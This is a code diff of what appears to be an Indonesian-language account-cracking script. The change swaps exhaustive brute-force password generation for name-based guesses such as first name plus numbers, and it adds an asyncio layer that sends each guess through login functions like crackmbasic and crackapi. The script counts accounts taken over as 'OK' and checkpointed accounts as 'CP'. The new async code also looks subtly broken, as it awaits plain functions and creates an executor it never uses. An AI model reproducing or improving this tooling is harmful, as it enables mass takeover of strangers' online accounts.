@@ -1,6 +1,8 @@
 #---------------------[ IMPORT-MODULE ]-------------------#
 
-import itertools
+import asyncio
+
+import concurrent.futures
 
 import requests, os, re, bs4, calendar, sys, json, time, random, datetime, subprocess, logging, base64,uuid
 
@@ -3028,63 +3030,75 @@ def setting():
 
 def passwrd():
     print('\x1b[1;92m<--------------------------------------------------------------------------------------------------->')
-    cetak(nel(f'\t\t {H2}Mainkan Mode Pesawat Setiap {K2}1000 ID {H2}Selama 10 Detik !'))
+    cetak(nel(f'\t\t{H2}Mainkan Mode Pesawat Setiap {K2}1000 ID {H2}Selama 10 Detik !'))
 
     with tred(max_workers=30) as pool:
         for yuzong in id2:
             idf, nmf = yuzong.split('|')[0], yuzong.split('|')[1].lower()
             frs = nmf.split(' ')[0]
-            pwv = []
+            pwv = set()
 
-            # Karakter yang mencakup semua kemungkinan
-            chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+"
-
-            # Mencoba kata sandi mulai dari panjang 6 hingga 10 karakter
-            for password_length in range(6, 11):
-                # Menghasilkan semua kombinasi kata sandi yang mungkin
-                password_combinations = itertools.product(chars, repeat=password_length)
-
-                # Tambahkan semua kombinasi kata sandi ke dalam pwv
-                for password in password_combinations:
-                    pwv.append("".join(password))
+            if len(nmf) < 6:
+                if len(frs) >= 3:
+                    pwv.update([frs + str(i) for i in range(123, 12346)])
+            elif len(frs) >= 3:
+                pwv.add(nmf)
 
             if 'ya' in pwpluss:
-                for xpwd in pwnya:
-                    pwv.append(xpwd)
-            else:
-                pass
+                pwv.update(pwnya)
 
-            if 'mbasic' in method:
-                pool.submit(crackmbasic, idf, pwv)
-            elif 'mobile' in method:
-                pool.submit(crackmobile, idf, pwv)
-            elif 'api' in method:
-                pool.submit(crackapi, idf, pwv)
-            elif 'free' in method:
-                pool.submit(crackfree, idf, pwv)
-            elif 'async' in method:
-                pool.submit(crackasync, idf, pwv)
-            elif 'reguler' in method:
-                pool.submit(crackreguler, idf, pwv)
-            elif 'touch' in method:
-                pool.submit(cracktouch, idf, pwv)
-            elif 'mtouch' in method:
-                pool.submit(crackmtouch, idf, pwv)
-            else:
-                pool.submit(crackmbasic, idf, pwv)
+            pwv.update([frs + str(i) for i in range(123, 12346)])
+
+            if len(frs) >= 5:
+                for i in range(10):
+                    pwv.add(frs + str(i))
+                if len(frs) >= 6:
+                    for i in range(10, 100):
+                        pwv.add(frs + str(i))
+                    for i in range(10):
+                        pwv.add(frs + '0' + str(i))
+
+            # Membuat event loop dan menjalankan proses password secara asynchronous
+            async def process_password_async(idf, password, method):
+                loop = asyncio.get_event_loop()
+                if 'mbasic' in method:
+                    await loop.run_in_executor(None, crackmbasic, idf, [password])
+                elif 'mobile' in method:
+                    await loop.run_in_executor(None, crackmobile, idf, [password])
+                elif 'api' in method:
+                    await crackapi(idf, [password])
+                elif 'free' in method:
+                    await crackfree(idf, [password])
+                elif 'async' in method:
+                    await crackasync(idf, [password])
+                elif 'reguler' in method:
+                    await crackreguler(idf, [password])
+                elif 'touch' in method:
+                    await cracktouch(idf, [password])
+                elif 'mtouch' in method:
+                    await crackmtouch(idf, [password])
+                else:
+                    await crackmbasic(idf, [password])
+
+            async def process_passwords_async(idf, pwv, method):
+                tasks = [process_password_async(idf, password, method) for password in pwv]
+                await asyncio.gather(*tasks)
+
+            # Menggunakan ThreadPoolExecutor untuk proses password
+            with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
+                loop = asyncio.get_event_loop()
+                loop.run_until_complete(process_passwords_async(idf, pwv, method))
 
     print('')
-    cetak(nel(f'\t\t\t {H2}Crack Selesai Cuy, Jangan Lupa Bersyukur'))
-
-    print(f'[{b}• {x}] {h} OK : {h}%s ' % (ok))
-    print(f' {x}[{b}• {x}] {k} CP : {k}%s {x} ' % (cp))
-
+    cetak(nel(f'\t\t\t{H2}Crack Selesai Cuy, Jangan Lupa Bersyukur'))
+    print(f'[{b}• {x}]{h} OK : {h}%s ' % (ok))
+    print(f'{x}[{b}• {x}]{k} CP : {k}%s {x} ' % (cp))
     print('')
     print('\x1b[1;93m[\x1b[1;92m?\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;92mLanjut Crack Kembali \33[m( \x1b[1;92mY\x1b[1;91m/\x1b[1;93mt \33[m) \x1b[1;92m? ')
 
     woi = input('\x1b[1;93m[\x1b[1;92m?\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;92mPilih > \x1b[1;93m')
 
-    if woi in ['y', 'Y']:
+    if woi in ['y','Y']:
         back()
     else:
         print(f'\T {x}>> {k} SAMPAI JUMPA LAGI {x} << ')
